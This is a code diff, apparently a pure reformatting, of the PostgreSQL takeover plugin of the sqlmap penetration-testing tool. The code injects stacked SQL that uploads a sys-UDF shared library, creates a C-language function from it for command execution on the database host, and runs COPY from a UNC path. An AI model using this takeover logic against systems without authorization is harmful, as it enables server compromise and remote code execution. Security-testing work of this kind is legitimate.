@@ -20,6 +20,7 @@ from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.request import inject
 from plugins.generic.takeover import Takeover as GenericTakeover
 
+
 class Takeover(GenericTakeover):
     def __init__(self):
         GenericTakeover.__init__(self)
@@ -32,13 +33,15 @@ class Takeover(GenericTakeover):
             # NOTE: by not specifing any path, it will save into the
             # data directory, on PostgreSQL 8.3 it is
             # C:\Program Files\PostgreSQL\8.3\data.
-            self.udfRemoteFile = "%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
+            self.udfRemoteFile = "%s.%s" % (
+                self.udfSharedLibName, self.udfSharedLibExt)
 
         # On Linux
         else:
             # The SO can be in any folder where postgres user has
             # read/write/execute access is valid
-            self.udfRemoteFile = "/tmp/%s.%s" % (self.udfSharedLibName, self.udfSharedLibExt)
+            self.udfRemoteFile = "/tmp/%s.%s" % (
+                self.udfSharedLibName, self.udfSharedLibExt)
 
     def udfSetLocalPaths(self):
         self.udfLocalFile = paths.SQLMAP_UDF_PATH
@@ -70,17 +73,32 @@ class Takeover(GenericTakeover):
 
         try:
             if Backend.isOs(OS.WINDOWS):
-                _ = os.path.join(self.udfLocalFile, "postgresql", "windows", "%d" % Backend.getArch(), majorVer, "lib_postgresqludf_sys.dll_")
+                _ = os.path.join(
+                    self.udfLocalFile,
+                    "postgresql",
+                    "windows",
+                    "%d" %
+                    Backend.getArch(),
+                    majorVer,
+                    "lib_postgresqludf_sys.dll_")
                 checkFile(_)
                 self.udfLocalFile = decloakToTemp(_)
                 self.udfSharedLibExt = "dll"
             else:
-                _ = os.path.join(self.udfLocalFile, "postgresql", "linux", "%d" % Backend.getArch(), majorVer, "lib_postgresqludf_sys.so_")
+                _ = os.path.join(
+                    self.udfLocalFile,
+                    "postgresql",
+                    "linux",
+                    "%d" %
+                    Backend.getArch(),
+                    majorVer,
+                    "lib_postgresqludf_sys.so_")
                 checkFile(_)
                 self.udfLocalFile = decloakToTemp(_)
                 self.udfSharedLibExt = "so"
         except SqlmapSystemException:
-            errMsg = "unsupported feature on PostgreSQL %s (%s-bit)" % (majorVer, Backend.getArch())
+            errMsg = "unsupported feature on PostgreSQL %s (%s-bit)" % (
+                majorVer, Backend.getArch())
             raise SqlmapUnsupportedFeatureException(errMsg)
 
     def udfCreateFromSharedLib(self, udf, inpRet):
@@ -90,9 +108,12 @@ class Takeover(GenericTakeover):
             inp = ", ".join(i for i in inpRet["input"])
             ret = inpRet["return"]
 
-            # Reference: http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
+            # Reference:
+            # http://www.postgresql.org/docs/8.3/interactive/sql-createfunction.html
             inject.goStacked("DROP FUNCTION %s(%s)" % (udf, inp))
-            inject.goStacked("CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" % (udf, inp, ret, self.udfRemoteFile, udf))
+            inject.goStacked(
+                "CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C RETURNS NULL ON NULL INPUT IMMUTABLE" %
+                (udf, inp, ret, self.udfRemoteFile, udf))
 
             self.createdUdf.add(udf)
         else:
@@ -100,5 +121,10 @@ class Takeover(GenericTakeover):
 
     def uncPathRequest(self):
         self.createSupportTbl(self.fileTblName, self.tblField, "text")
-        inject.goStacked("COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, self.uncPath), silent=True)
+        inject.goStacked(
+            "COPY %s(%s) FROM '%s'" %
+            (self.fileTblName,
+             self.tblField,
+             self.uncPath),
+            silent=True)
         self.cleanup(onlyFileTbl=True)
